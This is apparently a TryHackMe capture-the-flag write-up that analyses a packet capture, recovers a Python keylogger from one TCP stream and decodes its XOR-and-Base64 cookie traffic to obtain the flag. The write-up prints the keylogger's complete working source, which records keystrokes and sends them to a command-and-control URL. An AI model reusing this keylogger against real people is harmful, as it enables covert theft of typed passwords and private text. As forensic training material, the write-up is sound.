# Packed Light - THM

They provided a `.pcap` file.

I downloaded the file and opened it in **Wireshark**. I followed the TCP stream and found a cookie like:

```text
hotel_sess_state="something=="
```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d0597aa8-bf55-4510-a846-5c070139a577" />

The cookie value is Base64 encoded, but there were many TCP streams containing different Base64 cookies. So instead of checking each stream manually, I used the `strings` command with `grep` to extract all of the cookies.

I used this command to find all cookies:

<img width="819" height="816" alt="image" src="https://github.com/user-attachments/assets/7cb6b3bd-31a2-4741-b06d-c7bf2e791512" />

While checking the streams, I found something interesting in **TCP Stream 5**.

<img width="891" height="805" alt="image" src="https://github.com/user-attachments/assets/e29f67e7-2be5-4cd5-b5c5-f11736167bf7" />

It contains a request for `updates.py`:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))

    b64_string = base64.b64encode(encrypted).decode('utf-8')

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }

    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

This script contains the whole logic. It shows that:

- The cookie is Base64 encoded.
- Before encoding, every character is XORed with the key.
- The key is:

```text
H0t3lSt@ff0NlyK3epS3cr3t!
```

So I wrote a small Python script to decode every cookie.

```python
import base64

key = "H0t3lSt@ff0NlyK3epS3cr3t!".encode()

cookies = [
    "HA==","AA==","BQ==","Mw==","Hg==","ew==","Og==","fA==",
    "Fw==","eQ==","Ow==","Fw==","Pw==","fA==","PA==","Kw==",
    "IA==","eQ==","Jg==","Lw==","LQ==","Gg==","Fw==","MQ==",
    "LQ==","eA==","Hg==","LQ==","NQ==",
]

flag = ""

for c in cookies:
    enc = base64.b64decode(c)
    plain = bytes([enc[0] ^ key[0]])   # one character per cookie
    flag += plain.decode()

print(flag)
```

<img width="1317" height="633" alt="image" src="https://github.com/user-attachments/assets/1eec16d8-fd9f-43bc-a7eb-b79e6f0fe574" />

**Flag:**

```text
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```
